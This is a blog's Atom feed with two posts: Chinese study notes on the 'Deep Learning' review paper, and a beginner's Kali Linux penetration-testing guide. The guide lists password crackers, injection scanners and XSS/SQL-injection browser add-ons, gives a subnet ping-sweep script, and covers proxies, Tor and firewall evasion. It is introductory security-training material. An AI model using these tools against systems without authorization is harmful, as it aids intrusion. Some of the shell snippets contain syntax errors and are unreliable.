<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rookie の Blog</title>
  
  <subtitle>十年饮冰,难凉热血</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Roooooooooooooooookie.github.io/"/>
  <updated>2019-08-01T20:37:45.188Z</updated>
  <id>https://Roooooooooooooooookie.github.io/</id>
  
  <author>
    <name>纸歌</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Paper精读 Deep Learning</title>
    <link href="https://Roooooooooooooooookie.github.io/2019/08/01/Paper%E7%B2%BE%E8%AF%BB-Deep-Learning/"/>
    <id>https://Roooooooooooooooookie.github.io/2019/08/01/Paper精读-Deep-Learning/</id>
    <published>2019-08-01T04:41:34.000Z</published>
    <updated>2019-08-01T20:37:45.188Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Paper论文精读-–-深度学习综述-Deep-Learning"><a href="#Paper论文精读-–-深度学习综述-Deep-Learning" class="headerlink" title="Paper论文精读 – 深度学习综述(Deep Learning)"></a>Paper论文精读 – 深度学习综述(Deep Learning)</h4><hr><blockquote><p>本文主要是Paper论文精读系列第一篇文章主要关于深度学习综述的内容</p></blockquote><a id="more"></a><blockquote><p>0.1 论文介绍和作者介绍</p><ul><li>作者: Yann LeCun, Yoshua Bengio, Geoffrey Hinton</li><li>Geoffrey Hinton <ul><li>多伦多大学</li><li>1986 反向传播算法</li><li>1983 发明波尔茨曼机</li><li>2012 对卷积神经网络进行改进<ul><li>Yann LeCun</li><li>1980 发明卷积神经网络</li><li>1980末 首次将卷积神经网络用于手写数字识别</li><li>Yoshua Bengio</li><li>蒙特利尔大学</li><li>1990 将神经网络和概率模型结合在一起</li><li>2000 使用高维词向量来表征自然语言处理</li><li>文章发表时间:2015</li></ul></li></ul></li></ul></blockquote><blockquote><p>0.2 论文意义和主要内容</p><ul><li>论文意义: <ul><li>总览深度理论,模型,展开人工智能的新蓝图</li><li>探究深度学习最重要的算法和理论</li></ul></li><li>主要内容<ul><li>概念:<ul><li>深度学习允许多个处理层组成的计算模型来学习具有多个抽象级别的数据表示,这些方法极大地改善了语音识别</li><li>改善了视觉对象识别,物体检测以及药物发现和基因组等其他领域的技术</li></ul></li><li>原理:<ul><li>深度学习通过使用反向传播算法来指示机器应该如何更改其内部参数(用于从前一层的表示计算每个层中的表示)来发现大数据集中的复杂结构<ul><li>应用:</li></ul></li><li>深度卷积网络CNN在处理图像,视频,语音和音频带来了突破</li><li>而循环神经网络对文本和语音等顺序数据进行了彰显</li></ul></li></ul></li></ul></blockquote><blockquote><p>0.3 论文结构:</p><ul><li>1.引言 Introduction</li><li>2.监督学习 Supervised Learning (P1-P3)</li><li>3.反向传播算法 BackPropagation</li><li>4.卷积神经网络 CNN Convolutional neural networks</li><li>5.基于深度神经网络的图片理解 Image understanding</li><li>6.分布表示和语言模型 Language processing</li><li>7.循环神经网络 RNN Recurrent neural networks</li><li>8.深度学习的未来 The future</li></ul></blockquote><blockquote><p>0.4 前期知识储备</p><ul><li>了解基本的机器学习算法</li><li>RNN: 循环神经网络,掌握RNN的基本工作原理</li><li>CNN: 了解神经网络的结构和工作原理<br>0.5 课程安排和学习建议</li><li>day1 论文视频讲解</li><li>day2 泛读论文,已经标注了重点</li><li>day3 论文视频讲解</li><li>day4 精读论文,写分析笔记</li><li>day5 论文视频讲解</li><li>day6 作业,撰写博客</li></ul></blockquote><blockquote><p>0.6 学习建议</p><ul><li>精读经典论文</li><li>跟进最新论文</li><li>整理关注论文</li><li>复现领域论文<ul><li>加深对论文的理解</li><li>提高算法的能力</li></ul></li><li>写作论文</li></ul></blockquote><blockquote><p>1.引言</p></blockquote><p><img src="http://imgageblog.gz.bcebos.com/01-01.png?authorization=bce-auth-v1%2Fbe59fef9d88643f6b0e9ae7407052cc9%2F2019-08-01T06%3A21%3A51Z%2F300%2Fhost%2Fe9cdc2d12cfa4f4bb18a51a50a04a3e16d8a32aabd0f382a093a53dbd60de90d" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解释: 深度学习方法是拥有多级表示的学习方法,通过组合简单但非线性的模块来获得,每个模块将表示一个级别,从原始的输入开始转换为更高的表示,稍微更多的抽象层次呢,能够足够地组合这种变换,可以学习非常复杂的功能</span><br><span class="line"></span><br><span class="line">简单的方式理解: 用深度学习的方式和方法,多层的神经网络,来找到一个函数,这个函数能够被学习,这个函数最后能够表示非常复杂的功能比如语音识别,比如图片识别.</span><br></pre></td></tr></table></figure><blockquote><p>1.1 多层神经网络</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-02.png" alt="image"></p><ul><li>Multipe Layers of simple units</li><li>Each units compute a weighted sum of its inputs</li><li>Weighted sum is passed through a non-linear function</li><li>The learning algorithm changes the weights</li><li>激活函数:ReLU <blockquote><p>1.2 深度学习应用领域</p><ul><li>计算机视觉<ul><li>无人驾驶</li><li>图片识别领域</li></ul></li><li>自然语言处理<ul><li>智能搜索</li><li>人机会话等</li></ul></li><li>医学图像分析</li><li>自动驾驶</li><li>制药等</li></ul><p>1.3 深度学习的应用举例</p><ul><li>机器翻译</li><li>下围棋</li><li>目标检测</li><li>人脸识别</li><li>自动驾驶 </li></ul></blockquote></li></ul><blockquote><p>2 监督学习(Supervised Learning)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-03.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解释: 我们需要计算一个目标函数来测量出分数与所需分数之间的误差,其实就是距离,然后内部修改其内部的参数减少此错误(BP反向传播),这些可调的参数,我们通常称之为权重,是实数,可以看作是定义机器输入与输出功能的旋钮.在典型的机器学习系统中,可能存在这种可以调节的数以亿计的权重.以及可以训练机器数以亿计的这些示例.</span><br><span class="line"></span><br><span class="line">简单解释:我们有答案,也有数据,需要找到答案和数据之间的规律,而这些规律是什么,就好比调节收音机的旋钮一样,需要去调节参数,使用的是BP算法</span><br></pre></td></tr></table></figure><blockquote><p>2.1 梯度下降算法</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-04.png" alt="image"></p><p><img src="https://imgageblog.cdn.bcebos.com/01-06.png" alt="image"></p><p>直观解释:从山上某点到山谷的过程</p><p><img src="https://imgageblog.cdn.bcebos.com/01-05.png" alt="image"></p><blockquote><p>3 反向传播算法(Backpropagation)(P4-P6)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-07.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解释: </span><br><span class="line">    图(a) 仅仅包括2个输入层,2个隐藏层,1个输出层的示例</span><br><span class="line">    图(b) 链式法则</span><br><span class="line">    图(c) 正向传播</span><br><span class="line">    图(d) 反向传播</span><br></pre></td></tr></table></figure><blockquote><p>3.1 链式法则(Chain Rule)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-08.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">链式法则: </span><br><span class="line"> Case1:</span><br><span class="line">   x的微小变化引起y的微小变换,同时y的微小变换有引起z的微小变化</span><br><span class="line"> Case2:</span><br><span class="line">    该case表明链式法则可能不仅仅是影响一个因素,也可能影响多个因素</span><br></pre></td></tr></table></figure><blockquote><p>3.2 反向传递(Backward transfer)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-09.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Forward Pass: 从前向后,是一个计算的过程</span><br><span class="line">Backward Pass: 从后向前,是一个误差传递的过程,误差传递的过程也就是学习的过程</span><br></pre></td></tr></table></figure><blockquote><p>4 卷积神经网络 CNN</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-10.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">萨摩耶犬的图像识别</span><br><span class="line">  - rgb三个层次</span><br><span class="line">  - 识别是萨摩耶还是狼狗</span><br><span class="line">  - 信息自下而上的流动</span><br><span class="line">  - 较低级别的特征充当边缘的检测器,并输出每一个图像类别的计算分数</span><br><span class="line">  - 通过不同层来进行特征的获取</span><br></pre></td></tr></table></figure><blockquote><p>4.1 什么是CNN?</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-11.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">卷积神经网络的过程:</span><br><span class="line">  1. 预处理的数据用于卷积的计算,加上bias得到局部特征,其卷积核的尺寸和个数对模型的效果有一定的影响</span><br><span class="line">  2. 将第1步的输出结果进行非线性函数的处理,如目前常用的ReLU函数.</span><br><span class="line">  3. 进行池化操作,所谓池化操作实际是取出区域的平均值或者最大值,保留显著的特征,提升对激变的容忍能力</span><br><span class="line">  4. 全连接层,表示对结果的确认.</span><br></pre></td></tr></table></figure><p>动画演示如下:<br><img src="https://imgageblog.cdn.bcebos.com/01-01.gif" alt="image"></p><blockquote><p>5 CNN理解图片(Understanding Image by CNN)</p></blockquote><p>看图说话:<br><img src="https://imgageblog.cdn.bcebos.com/01-12.png" alt="IMAGE"></p><blockquote><p>6.分布式表示和语言模型(Language processing)</p></blockquote><blockquote><p>6.1 理解Embedding(Understanding Embedding)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-13.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">独立热编码: 1个位置代表一个词意,但是不能代表一个词真正的意思,one-hot 会维度很大</span><br><span class="line">Word Embedding: 相近的词汇有相近的意思</span><br></pre></td></tr></table></figure><p><img src="https://imgageblog.cdn.bcebos.com/01-14.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 句子也可以进行Embedding</span><br><span class="line">- word embedding</span><br><span class="line">- sentence embedding</span><br></pre></td></tr></table></figure><blockquote><p>6.2 Word2Vec算法(2013提出)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-15.png" alt="image"></p><blockquote><ol start="7"><li>循环神经网络</li></ol></blockquote><blockquote><p>7.1 理解RNN</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-16.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">循环神经网络的特点如上所述:</span><br><span class="line">   - 时间序列</span><br><span class="line">   - 隐藏层会保持以前的数据</span><br><span class="line">   - 带有存储功能的神经网络</span><br></pre></td></tr></table></figure><blockquote><p>7.2 LSTM(Long Short-term Memory)</p></blockquote><p><img src="https://imgageblog.cdn.bcebos.com/01-17.png" alt="image"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 特殊的RNN,也是门限RNN</span><br><span class="line">2. 主要解决RNN训练过程中梯度消失和梯度爆炸的问题</span><br><span class="line">3. 比普通的RNN更好</span><br></pre></td></tr></table></figure><blockquote><ol start="8"><li>未来(Future)</li></ol></blockquote><ul><li>非监督学习<br><img src="https://imgageblog.cdn.bcebos.com/01-18.png" alt="image"></li><li>强化学习<br><img src="https://imgageblog.cdn.bcebos.com/01-19.png" alt="image"></li><li>GAN(Generative Aversarial Networks)<br><img src="https://imgageblog.cdn.bcebos.com/01-20.png" alt="image"></li><li>自监督学习<br><img src="https://imgageblog.cdn.bcebos.com/01-21.png" alt="image"></li></ul><blockquote><p>问题:</p><ul><li>提高入读门槛,多看顶会论文</li><li>看论文先读摘要,绪论以及结论部分,了解论文的核心内容,契合研究方向进行精度细粒读</li><li>代码复现可取github</li><li>调参技巧:<ul><li>模型参数大于数据量大时,相当于求解一个欠定方程,容易多解,过拟合</li><li>模型参数远小于数据量时,相当于求解超定方程,可能误解,或有解但准确率低,欠拟合</li><li>模型参数如何与数据量做到匹配,是一个工程问题,需要结合问题和数据量多做</li></ul></li><li>如何确定一层卷积使用多少个卷积核<ul><li>卷积核的个数要随具体问题数据量参数大小等决定,没有绝对的方法定多少个</li><li>卷积核其实就是最后用于提取特征的映射函数的参数,随具体训练而定,刚开始随机初始化,后面逐渐进行优化,所以最后不会一模一样<ul><li>为什么CNN可以提取特征?卷积是如何把特征提取出来的?</li><li>CNN是利用卷积操作提取特征,32个卷积核就是学习32种特征,卷积操作其实就是对应内积再求和,不同位置结果不变,具有空间位移不变性,所以可以提取特征</li></ul></li></ul></li><li>激活函数的作用:<ul><li>给神经网络中添加非线性因素,提供了网络的非线性建模能力,通过定义对神经元节点输出的映射,本质上是将输入x映射到(-1,1)或者(0,1)的实数空间,即输入向量与权重的内积再加上bias经过激活函数映射处理之后再做为输出<ul><li>损失函数:</li><li>使用1/2 比较好求导</li><li>自监督学习与无监督学习的本质区别</li></ul></li></ul></li></ul></blockquote><ul><li>全连接层的作用:<ul><li>最后将前面的隐藏层学习到的”分布式特征表示”映射到样本标记空间</li></ul></li><li>卷积核的本质就是神经元间连接参数的权重</li><li>反向传播本质上是不断优化卷积核里的数值,最终提取到图像的特征</li><li>激活函数在卷积神经网络中的作用:</li></ul><p><img src="https://imgageblog.cdn.bcebos.com/01-22.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-23.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-24.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-25.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-26.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-27.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-28.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/01-29.png" alt="image"></p><blockquote><p>词汇:</p><ul><li>transcribe: 转换,转变</li><li>Conventional: 传统</li><li>suppress irrelevant variantions: 抑制无关变量</li><li>repsentaion:表示</li><li>the presence or absence 是否存在</li><li>orientation:方向</li><li>motifs:主题</li><li>spotting:看见,看出,发现</li><li>assemble:集合</li><li>subsequent:随后的</li><li>intricate:错综复杂的</li><li>potential</li><li>molecules:分子</li><li>particle accelerator:粒子加速器</li><li>mutations:突变</li><li>gene expression and disease:基因表达和疾病</li><li>promising:有希望,前途有望的</li><li>sentiment:情绪</li><li>desired category:期望的类别</li><li>a tiny amount:微量</li><li>hilly: 丘陵</li><li>landscape:景观</li><li>stochastic:随机</li><li>elaborate:复杂的,详尽的,精心制作的</li><li>generalization ability:泛化能力</li><li>sensible:理智的</li><li>pratical application:实际应用</li><li>hand-engineered features:手工设计的特征</li><li>carve:雕刻,切成块</li><li>hyperplane:超平面</li><li>illumination:照明</li><li>pitch:音调</li><li>minute:分钟,微小的</li><li>Samoyed:萨摩耶狗</li><li>shallow:肤浅的,浅薄的</li><li>distort:歪曲</li></ul></blockquote><blockquote><p>注: 图片均来自深度之眼</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Paper论文精读-–-深度学习综述-Deep-Learning&quot;&gt;&lt;a href=&quot;#Paper论文精读-–-深度学习综述-Deep-Learning&quot; class=&quot;headerlink&quot; title=&quot;Paper论文精读 – 深度学习综述(Deep Learning)&quot;&gt;&lt;/a&gt;Paper论文精读 – 深度学习综述(Deep Learning)&lt;/h4&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;本文主要是Paper论文精读系列第一篇文章主要关于深度学习综述的内容&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="计算机视觉(Computer Vision)" scheme="https://Roooooooooooooooookie.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89-Computer-Vision/"/>
    
      <category term="Paper精读" scheme="https://Roooooooooooooooookie.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89-Computer-Vision/Paper%E7%B2%BE%E8%AF%BB/"/>
    
    
      <category term="深度学习" scheme="https://Roooooooooooooooookie.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="计算机视觉" scheme="https://Roooooooooooooooookie.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"/>
    
  </entry>
  
  <entry>
    <title>Kali 渗透测试(入门篇)</title>
    <link href="https://Roooooooooooooooookie.github.io/2019/07/31/Kali%20LInux-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF(%E5%85%A5%E9%97%A8%E7%AF%87)/"/>
    <id>https://Roooooooooooooooookie.github.io/2019/07/31/Kali LInux-渗透测试技术(入门篇)/</id>
    <published>2019-07-31T04:41:34.000Z</published>
    <updated>2020-02-29T14:46:45.326Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍</p></blockquote><a id="more"></a><h2 id="Kali-Linux-从入门到精通-一-概论"><a href="#Kali-Linux-从入门到精通-一-概论" class="headerlink" title="Kali Linux 从入门到精通(一)-概论"></a>Kali Linux 从入门到精通(一)-概论</h2><blockquote><p>基本介绍</p><ul><li>1.安全目标<ul><li>先于攻击者发现和防止漏洞出现<ul><li>攻击型安全</li><li>防护型安全</li></ul></li></ul></li><li>2.渗透测试<ul><li>尝试挫败安全防御机制,发现系统安全弱点</li><li>从攻击者的角度思考,测量安全防护有效性</li><li>证明安全问题的存在,而非破坏</li><li>道德约束</li><li>法律</li></ul></li></ul></blockquote><ul><li>3.渗透测试标准(The Penetration Testing Execution Standard)<ul><li>PETS (<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">http://www.pentest-standard.org</a>) </li><li>前期交互阶段:需要划清范围,通常划分为多个子系统进行渗透测试</li><li>情报收集阶段:主动收集,被动收集</li><li>威胁建模阶段:逆向工程,编写针对漏洞的代码</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段</li><li>渗透测试报告</li></ul></li><li>4.渗透测试项目<ul><li>渗透测试范围</li><li>获得授权(客户授权)</li><li>渗透测试方法<ul><li>是否允许社会工程学</li><li>是否允许拒绝服务攻击</li></ul></li></ul></li><li>5.渗透测试误区<ul><li>扫描器就是一切&lt;==只是一种手段<ul><li>忽视业务逻辑重的漏洞</li></ul></li></ul></li><li>6.KALI Linux介绍<ul><li>基于Debain的Linux发行版本</li><li>前身是BackTrack 2013年3月发布</li><li>用于渗透测试和安全审计</li><li>包含600+安全工具</li><li>FHS标准目录结构</li><li>定制内核</li><li>支持ARM和手机平台</li><li>开源免费 </li></ul></li><li>7.KALI LINUX 策略<ul><li>ROOT用户策略</li><li>网络服务策略</li><li>更新升级策略</li></ul></li></ul><ul><li>8.建议<ul><li>实践是检验真理的唯一标准</li><li>不要停留在了解的程度</li><li>Kali很强大,但不是全部</li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-二-安装"><a href="#Kali-Linux-从入门到精通-二-安装" class="headerlink" title="Kali Linux 从入门到精通(二)-安装"></a>Kali Linux 从入门到精通(二)-安装</h2><blockquote><p>Kail Linux 安装</p></blockquote><ul><li>持久加密USB安装-1<ul><li>LUSK:Linux Unified Key Setup<ul><li>磁盘分区加密规范</li><li>不依赖与操作系统的磁盘级加密</li><li>Window——-DoxBox</li><li>后端: dm-crypt</li><li>前端: crtptsetup</li><li>微软的bitlocker</li></ul></li><li>将镜像刻录到U盘<ul><li>dd if=kali-linux-version.iso of=/dev/sd* bs=1M(if–input file of=output file bs具体传输块的大小)</li></ul></li></ul></li><li>持久加密USB安装-2<ul><li>为U盘创建额外分区</li><li>使用LUKS加密分区</li><li>打开加密分区</li><li>格式化加密分区+卷标</li><li>挂在加密分区,并创建persistence.conf文件<blockquote><p>熟悉环境</p><ul><li>登录密码:官方下载:用户root 密码为toor</li><li>top10安全工具</li><li>aircrack-ng 无线安全攻击套件</li><li>brupsuite:基于web,手动web渗透测试工具,通过截断客户端到服务器的请求,通过变更数据查看漏洞</li><li>hydra:密码破解工具</li><li>john:密码破解工具</li><li>maltgo:收集信息,层级性的信息收集手段,根据有限信息,收集大量信息</li><li>metasplot framework:渗透测试框架,可以替代很多安全工具,一体化作战工具</li><li>nmap:网络发现层的扫描器,网络扫描工具</li><li>owasp-zap:与brupsuit属于一类工具</li><li>sqlmap: sql注入工具</li><li>wireshark: 抓包分析工具</li><li>字体调整</li><li>监视网络流量</li><li>强行终止程序</li><li>文件目录</li><li>共享文件 </li></ul></blockquote></li></ul></li></ul><blockquote><p>Kali 目录结构</p><ul><li>bin:所有用户使用的执行程序目录</li><li>root: 引导程序目录:如grup</li><li>dev:设备目录</li><li>etc:配置文件目录</li><li>home:用户主目录</li><li>lib: 放置各种库文件目录</li><li>lib64</li><li>lost+found: 丢失文件目录</li><li>media:挂载外接目录</li><li>mnt</li><li>opt:应用程序目录</li><li>proc</li><li>root</li><li>sbin</li><li>selinux</li><li>srv</li><li>sys</li><li>sbin</li><li>share</li><li>var:日志,存放经常变动的目录</li></ul></blockquote><blockquote><p>熟悉常用bash命令</p><ul><li>ls:相当于dir<ul><li>ls -l:<ul><li>前面字符:d 表示目录 - 表示文件 l 表示链接,相当于快捷方式 c表示设备 -b 表示块设备</li></ul></li><li>ls -a: </li><li>ls -lh:以k显示</li><li>ls -lh –sort==size 进行排序</li></ul></li><li>cd:进入目录<ul><li>cd . 表示当前目录</li><li>cd .. 进入上一级目录</li><li>pwd 当前工作目录</li><li>cd  进入用户主目录</li></ul></li><li>cat:查看文件内容</li><li>more:会显示文件的百分比数</li><li>less</li><li>tail 文件: 显示文件最后几行</li><li>watch -n  t [命令] 每隔t秒查看信息</li><li>rm:删除文件</li><li>cp:拷贝命令 cp ps ps1</li><li>top:监视linux系统性能的命令</li><li>ps:查看进程信息<ul><li>ps aux</li></ul></li><li>grep:grep [文件字符串或者需要的内容] 文件位置</li><li>ifconfig:查看网络信息<ul><li>ifconfig eth0 down 将网卡宕掉</li><li>ifconfig eth0 up   重新启动网卡</li></ul></li><li>netstat:查看网络连接信息<ul><li>netstat -pautu: 进行网络连接信息</li></ul></li><li>awk</li><li>管道:可对信息进行筛选,管道亦有很多命令(需掌握)</li><li>mount:用来挂载的命令</li><li>dmesg:查看msg文件内容</li><li>find: <ul><li>find / -nmap nmap 查找文件</li><li>find . [文件] 查找当前目录中的文件 </li></ul></li><li>whereis [文件] -b [查找二进制执行文件]</li><li>echo:显示当前文件</li><li>man指令:相当于手册</li></ul></blockquote><blockquote><p>vi编辑器基本使用(后续补充)</p></blockquote><ul><li>: set nu 显示行号</li><li>: wq     保存退出<blockquote><p>管道(后续补充)</p></blockquote></li><li>| 管道符</li><li>||</li><li>&amp; 前后两个命令依次执行</li><li>&amp;&amp; 逻辑与会有逻辑短路现象</li></ul><blockquote><p>shell脚本(后续补充)   </p></blockquote><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -n &quot;IP : &quot;</span><br><span class="line">read ip</span><br><span class="line">echo &quot;your ip is:&quot; $ip</span><br><span class="line"></span><br><span class="line"># 使用 chmod +x 文件名.sh 更改权限</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 实现9*9乘法表</span><br><span class="line">for n in &apos;seq 9&apos;</span><br><span class="line">do</span><br><span class="line">for m in &apos;seq &amp;n&apos;</span><br><span class="line">  do </span><br><span class="line">    echo -n &quot;$m*$n=&quot; &apos;expr $m \* &amp;n&apos;&quot;  &quot;</span><br><span class="line">  done</span><br><span class="line">  echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 循环发现所有活的ip地址</span><br><span class="line">for n in &apos;seq 254&apos;</span><br><span class="line">do </span><br><span class="line">  # -c 表示只ping一个包 awk 指定第四列,对应的是ip地址</span><br><span class="line">  ping 192.168.1.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos; | awk -F &apos;&#123;print $1&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="Kali-Linux-从入门到精通-三-入侵系统定制"><a href="#Kali-Linux-从入门到精通-三-入侵系统定制" class="headerlink" title="Kali Linux 从入门到精通(三)-入侵系统定制"></a>Kali Linux 从入门到精通(三)-入侵系统定制</h2><blockquote><p>定制</p></blockquote><ul><li><p>网络配置</p><ul><li>临时IP地址<ul><li>dhclient eth0</li><li>ifconfig eth0 192.168.11/24</li><li>route add default gw 192.168.1.1  # 添加默认网关</li><li>echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</li></ul></li><li>固定IP地址(计算机重启后依然生效)<ul><li>auto th0</li><li>iface th0 inel stalic</li><li>address 192.168.20.1</li><li>netmask 255.255.255.0</li><li>network 192.168.20.255</li><li>broadcast 192.168.20.255</li><li>gateway  192.168.20.2</li><li>dns-nameservers 192.168.1.1 192.168.1.2</li><li>up route add -net 172.16.5.0 gw 192.168.10.100 eth1</li><li>down route del -net 172.24.0.0/24</li></ul></li></ul></li><li><p>更新升级</p><ul><li>apt-get update: 实际上是更新的是包的索引文件</li><li>apt-get upgrade: 实际更新包的指令</li></ul></li><li><p>安装软件包</p><ul><li>库<ul><li>apt-get 命令</li></ul></li><li>安装适合自己的工具软件<ul><li>apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs-y</li></ul></li></ul></li><li><p>浏览器插件</p><ul><li>firefox浏览器插件<ul><li>flashgof(基于浏览器插件的下载插件),autoproxy(翻墙插件),Tamper Data(提交修改),cooike,importer,Cookies Manager,Download Youtube Videos as MP4,Firebug,Flagfox(显示服务器位置),HackBar(F9进入操作),hashr(计算Hash值),User Agent Switcher(修改User Agent 可用于欺骗服务器),XSS me,SQL Inject Me</li></ul></li><li>xss-me:<a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></li><li>sql-inject-me: <a href="https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss" target="_blank" rel="noopener">https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss</a></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-四-代理"><a href="#Kali-Linux-从入门到精通-四-代理" class="headerlink" title="Kali Linux 从入门到精通(四)-代理"></a>Kali Linux 从入门到精通(四)-代理</h2><ul><li><p>翻墙&amp;代理</p><ul><li><p>GFW长城防火墙</p><ul><li>Facebook,youtube</li></ul><p>client–&gt;goagent–&gt;GAE–&gt;目标网站               </p></li><li><p>翻墙</p><ul><li>http代理:明文传输存在弊端,容易被长城防火墙发现容量,现在可以使用https进行加密</li><li>socks代理</li><li>ssh代理</li><li>VPN</li></ul></li><li><p>Goagent</p></li><li><p>Tor:暗网</p><ul><li>保护隐私防止被追踪</li><li>志愿者组成</li><li>长期在天朝无法使用<ul><li>感谢云</li></ul></li><li>暗网<ul><li>互联网引擎无法发现</li><li>互联网黑市</li></ul></li></ul></li></ul></li></ul><ul><li>代理的意义所在<ul><li>加密通信</li><li>隐藏来源</li><li>突破网络封锁</li></ul></li><li>注意事项<ul><li>不要触及敏感地带</li><li>不要从事非法行为</li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-五-测试环境准备"><a href="#Kali-Linux-从入门到精通-五-测试环境准备" class="headerlink" title="Kali Linux 从入门到精通(五)-测试环境准备"></a>Kali Linux 从入门到精通(五)-测试环境准备</h2><blockquote><p>准备实验环境</p></blockquote><ul><li><p>渗透非系统授权的弊端</p></li><li><p>搭建自己的实验环境</p><blockquote><p>安装虚拟机</p></blockquote></li><li><p>微软最新软件</p><ul><li><a href="http://msdn.microst.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microst.com/en-ca/subscriptions/aa336858</a></li></ul></li><li><p>windows虚拟机 </p><ul><li><a href="http://dev.modern.ie/tools/vms" target="_blank" 